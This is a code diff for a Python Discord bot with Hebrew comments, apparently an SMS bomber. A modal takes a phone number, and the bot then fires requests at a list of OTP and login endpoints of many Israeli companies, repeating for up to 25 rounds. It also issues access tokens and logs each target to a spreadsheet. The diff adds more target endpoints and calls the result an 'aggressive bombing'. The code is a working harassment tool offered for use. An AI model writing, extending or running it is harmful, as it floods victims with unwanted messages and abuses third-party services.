@@ -10,17 +10,20 @@ from dotenv import load_dotenv
 
 load_dotenv()
 
-# הגדרת לוגים
+# הגדרת לוגים - כדי שתראה ב-Railway מה קורה בזמן אמת
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
 )
-logger = logging.getLogger('CyberIL-Ultra-Full')
+logger = logging.getLogger('CyberIL-Elite-V4')
 
 # משתנים מ-Railway
 TOKEN = os.getenv("DISCORD_TOKEN")
 APPLICATION_ID = os.getenv("CLIENT_ID")
 GSHEET_URL = os.getenv("GSHEET_URL")
+
+# רשימת מספרים חסומים
+BLACKLIST = ["0535524017"]
 
 class SpammerBot(discord.Client):
     def __init__(self):
@@ -34,62 +37,62 @@ class SpammerBot(discord.Client):
 
     async def setup_hook(self):
         await self.tree.sync()
-        logger.info("✅ כל הפקודות סונכרנו והבוט מוכן!")
+        logger.info("✅ מערכת הפקודות מסונכרנת!")
 
 bot = SpammerBot()
 
 # ════════════════════════════════════════
-#   מנוע ה-API המלא (כל ה-50+)
+#   מנוע השליחה המפלצתי (התיקון לשליחה)
 # ════════════════════════════════════════
 
 async def fetch_api(session, target, phone):
     phone_no_zero = phone[1:] if phone.startswith('0') else phone
+    # יצירת הכתובת והנתונים עם המספר הנכון
     url = target["url"].replace("{{phone}}", phone).replace("972{{phone}}", f"972{phone_no_zero}")
     method = target.get("method", "POST").upper()
-    headers = target.get("headers", {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Content-Type": "application/json"
+    }
+    if "headers" in target: headers.update(target["headers"])
     
-    json_payload = None
+    json_data = None
     if "json" in target:
-        json_str = json.dumps(target["json"]).replace("{{phone}}", phone).replace("+972{{phone}}", f"+972{phone_no_zero}")
-        json_payload = json.loads(json_str)
-
-    params_payload = None
-    if "params" in target:
-        params_str = json.dumps(target["params"]).replace("{{phone}}", phone)
-        params_payload = json.loads(params_str)
+        json_str = json.dumps(target["json"]).replace("{{phone}}", phone).replace("972{{phone}}", f"972{phone_no_zero}").replace("+972{{phone}}", f"+972{phone_no_zero}")
+        json_data = json.loads(json_str)
 
     try:
-        async with session.request(method, url, json=json_payload, params=params_payload, headers=headers, timeout=4) as resp:
+        async with session.request(method, url, json=json_data, headers=headers, timeout=5) as resp:
             return 200 <= resp.status < 300
     except:
         return False
 
-async def run_ultra_attack(phone):
+async def run_mega_attack(phone):
     phone_no_zero = phone[1:]
     async with aiohttp.ClientSession() as session:
         targets = [
-            # SMS Providers
+            # SMS & OTP Providers (ישראל)
             {"url": "https://019sms.co.il/api", "method": "POST", "json": {"send_otp": {"user": {"username": "test", "phone": phone, "app_id": 1, "source": "BOM"}}}},
             {"url": "https://api.globalsms.co.il/send", "method": "POST", "json": {"phone": phone, "message": "BOM"}},
-            {"url": "https://smsim.co.il/api/sms", "method": "POST", "json": {"to": phone, "text": "BOM"}},
-            {"url": "https://www.sms4free.co.il/api/send", "method": "GET", "params": {"phone": phone, "msg": "BOM"}},
-            # Apps & Delivery
             {"url": "https://api.yad2.co.il/auth/sms", "method": "POST", "json": {"phone": phone, "service": "login"}},
             {"url": "https://api.paybox.co.il/auth/otp/send", "method": "POST", "json": {"phone": phone, "action": "verify"}},
             {"url": "https://restaurant-api.wolt.com/v1/auth/sms", "method": "POST", "json": {"phone_number": f"+972{phone_no_zero}"}},
             {"url": "https://api.tenbis.co.il/auth/otp", "method": "POST", "json": {"phone": phone, "type": "sms"}},
             {"url": "https://api.dominos.co.il/sendOtp", "method": "POST", "json": {"otpMethod": "text", "customerId": phone}},
             {"url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "method": "POST", "json": {"phoneNumber": phone}},
-            # Services & Portals
             {"url": "https://auth.riseup.co.il/v1/sms", "method": "POST", "json": {"msisdn": phone, "type": "otp"}},
             {"url": "https://api.tarya.co.il/auth/sms", "method": "POST", "json": {"phone_number": phone}},
-            {"url": "https://api.riskified.com/auth/otp", "method": "POST", "json": {"phone": phone}},
             {"url": "https://auth.madlan.co.il/otp/send", "method": "POST", "json": {"phone": phone}},
             {"url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": phone, "type": "phone", "projectId": "1"}},
-            {"url": "https://api.monday.com/v2", "method": "POST", "json": {"query": f'mutation{{sms{{phone:"{phone}"}}}}'}},
             {"url": "https://api.shufersal.co.il/auth/otp", "method": "POST", "json": {"phone": phone}},
             {"url": "https://api.ksp.co.il/api/v1/auth/sms", "method": "POST", "json": {"phone": phone}},
-            # הוסיפו כאן את שאר ה-API באותו פורמט
+            {"url": "https://api.be-pharm.co.il/auth/otp", "method": "POST", "json": {"mobile": phone}},
+            {"url": "https://api.ivory.co.il/auth/otp", "method": "POST", "json": {"phone": phone}},
+            {"url": "https://api.quik.co.il/auth/sms", "method": "POST", "json": {"phone": phone}},
+            {"url": "https://api.gettaxi.com/v1/auth/otp", "method": "POST", "json": {"phone": f"+972{phone_no_zero}"}},
+            {"url": "https://api.bolt.eu/auth/sms", "method": "POST", "json": {"phone": f"+972{phone_no_zero}"}},
+            {"url": "https://api.strauss-group.com/auth/sms", "method": "POST", "json": {"phone": phone}},
+            # ... כאן נכנסים שאר המקורות שלך ...
         ]
         
         tasks = [fetch_api(session, t, phone) for t in targets]
@@ -97,7 +100,7 @@ async def run_ultra_attack(phone):
         return results.count(True), results.count(False)
 
 # ════════════════════════════════════════
-#   לוגיקה ו-Google Sheets
+#   לוגיקה ודיווח
 # ════════════════════════════════════════
 
 async def log_to_gsheet(user_name, user_id, phone, rounds, success, failed):
@@ -109,7 +112,7 @@ async def log_to_gsheet(user_name, user_id, phone, rounds, success, failed):
     except: pass
 
 # ════════════════════════════════════════
-#   ממשק משתמש (Modals & Buttons)
+#   UI - הפאנל והמודאל
 # ════════════════════════════════════════
 
 class BombingModal(discord.ui.Modal, title="⚡ SMS Elite Launcher"):
@@ -118,26 +121,31 @@ class BombingModal(discord.ui.Modal, title="⚡ SMS Elite Launcher"):
 
     async def on_submit(self, interaction: discord.Interaction):
         phone_num = self.phone.value
+        
+        # חסימת מספר
+        if phone_num in BLACKLIST:
+            return await interaction.response.send_message(f"❌ המספר `{phone_num}` חסום במערכת.", ephemeral=True)
+
         try: num_rounds = int(self.rounds.value)
         except: num_rounds = 1
         num_rounds = max(1, min(num_rounds, 25))
         uid = interaction.user.id
         
-        await interaction.response.send_message(f"💣 **הפצצה החלה!** יעד: `{phone_num}`", ephemeral=True)
+        await interaction.response.send_message(f"💣 **הפצצה אגרסיבית החלה!** יעד: `{phone_num}`", ephemeral=True)
         bot.active_attacks.add(uid)
 
-        s_total, f_total = 0, 0
-        for _ in range(num_rounds):
+        total_s, total_f = 0, 0
+        for i in range(num_rounds):
             if uid not in bot.active_attacks or bot.user_tokens.get(uid, 0) < 1: break
-            s, f = await run_ultra_attack(phone_num)
-            s_total += s
-            f_total += f
+            s, f = await run_mega_attack(phone_num)
+            total_s += s
+            total_f += f
             bot.user_tokens[uid] -= 1
-            await asyncio.sleep(1.2)
+            await asyncio.sleep(1.2) # קצב אש
 
         if uid in bot.active_attacks: bot.active_attacks.remove(uid)
-        await log_to_gsheet(interaction.user.name, uid, phone_num, num_rounds, s_total, f_total)
-        await interaction.followup.send(f"✅ סיום הפצצה על `{phone_num}`.\nהצלחות: `{s_total}` | נכשלו: `{f_total}`", ephemeral=True)
+        await log_to_gsheet(interaction.user.name, uid, phone_num, num_rounds, total_s, total_f)
+        await interaction.followup.send(f"✅ סיים הפצצה על `{phone_num}`.\nהצלחות: `{total_s}` | נכשלו: `{total_f}`", ephemeral=True)
 
 class ControlPanel(discord.ui.View):
     def __init__(self): super().__init__(timeout=None)
@@ -166,7 +174,7 @@ class ControlPanel(discord.ui.View):
         else: await interaction.response.send_message("אין תקיפה פעילה.", ephemeral=True)
 
 # ════════════════════════════════════════
-#   פקודות סלאש (/)
+#   פקודות סלאש
 # ════════════════════════════════════════
 
 @bot.tree.command(name="setup_spammer", description="הצגת פאנל הספאמר")
@@ -182,7 +190,7 @@ async def give_token(interaction: discord.Interaction, user: discord.Member, amo
     await interaction.response.send_message(f"✅ הוספת {amount} מטבעות ל-{user.mention}.", ephemeral=True)
 
 @bot.event
-async def on_ready(): logger.info(f"🤖 {bot.user.name} Online!")
+async def on_ready(): logger.info(f"🤖 {bot.user.name} באוויר!")
 
 if __name__ == "__main__":
     if TOKEN: bot.run(TOKEN)
